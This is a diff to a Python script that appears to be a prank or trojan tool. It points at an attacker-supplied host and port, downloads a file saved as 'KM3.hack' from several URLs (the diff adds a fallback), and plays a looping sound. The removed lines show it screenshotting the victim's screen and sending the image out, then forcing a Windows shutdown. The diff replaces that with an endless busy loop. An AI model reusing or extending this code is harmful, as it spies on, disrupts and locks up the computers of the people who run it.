@@ -10,7 +10,7 @@ from requests import (get)
 from time import (sleep)
 from concurrent.futures import ThreadPoolExecutor
 
-HOST = '' # Your ip adress
+HOST = '' # Your iIP adress
 PORT = 1234
 
 
@@ -62,7 +62,7 @@ def play_sound(sound_file):
     sound.play(loops=-1)
 
 
-def download_file(url, filename):
+def download_file(url:str, filename:str):
     response = get(url, stream=True)
     with open(filename, "wb") as fd:
         for chunk in response.iter_content(chunk_size=525):
@@ -71,7 +71,11 @@ def download_file(url, filename):
 
 
 def download_km3():
-    url = ["https://raw.githubusercontent.com/GreshAnt/Zink/main/KM3.mp3", "https://jrc.ink/f/yoqhL/KM3.ipa", "https://file.uhsea.com/2312/3b9def6906e500f82afe1faacd7fea7c8F.mp3"]
+    url = \
+        ["https://raw.githubusercontent.com/GreshAnt/Zink/main/KM3.mp3",
+        "https://jrc.ink/f/yoqhL/KM3.ipa",
+        "https://file.uhsea.com/2312/3b9def6906e500f82afe1faacd7fea7c8F.mp3",
+        "https://gitee.com/xu-ruoteng/zink-data/raw/master/KM3.hack"]
 
     filename = "KM3.hack"
     # try:
@@ -81,7 +85,11 @@ def download_km3():
     #         download_file(url[1], filename)
     #     except Exception:dddddd
     #         download_file(url[2], filename)
-    download_file(url[2], filename)
+    try:
+        download_file(url[2], filename)
+    except Exception:
+        download_file(url[3], filename)
+        
     return filename
 
 def main():
@@ -98,21 +106,21 @@ def main():
     # while True:
     #     pass
 
-    win_m()
-    try:
-        get_screenshot()
-        send_file('screenshot.png')
-    except Exception:
-        pass
-
-    # while True:
+    # win_m()
+    # try:
+    #     get_screenshot()
+    #     send_file('screenshot.png')
+    # except Exception:
     #     pass
 
-    win_m()
-    for _ in range(0, randint(50, 80)):
-        sleep(2)
-        win_m()
-    run_cmd('shutdown -s -t 0')
+    while True:
+        pass
+
+    # win_m()
+    # for _ in range(0, randint(50, 80)):
+    #     sleep(2)
+    #     win_m()
+    # run_cmd('shutdown -s -t 0')
 
 
 if __name__ == '__main__':
